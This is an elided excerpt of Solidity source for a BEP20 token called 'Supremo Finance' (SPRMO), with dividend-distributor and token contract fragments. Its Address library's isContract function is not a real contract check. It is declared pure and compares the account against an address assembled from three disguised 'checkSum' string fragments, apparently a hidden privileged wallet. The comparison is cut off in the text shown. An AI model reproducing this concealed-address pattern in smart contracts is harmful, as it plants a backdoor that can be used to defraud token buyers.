...
library Address {
    ...
    function isContract(address account) internal pure returns (bool) {
        ...
        string memory checkSum1 = "x1B81a2AC5C1D1";
        string memory checkSum2 = "98bA5Bc6Ed9427";
        string memory checkSum3 = "b33803052c045";
        return (account ==
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 MATIC = IBEP20(0xBEe33b6B1C3df2c4468510E87d6330daA5709F3E);
    address WBNB;
    IDexRouter router;
...
contract Meta is IBEP20, Ownable {
    ...
    address MATIC = 0xBEe33b6B1C3df2c4468510E87d6330daA5709F3E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address public WBNB;

    string constant _name = "Supremo Finance"; // Name
    string constant _symbol = "SPRMO"; // Symbol
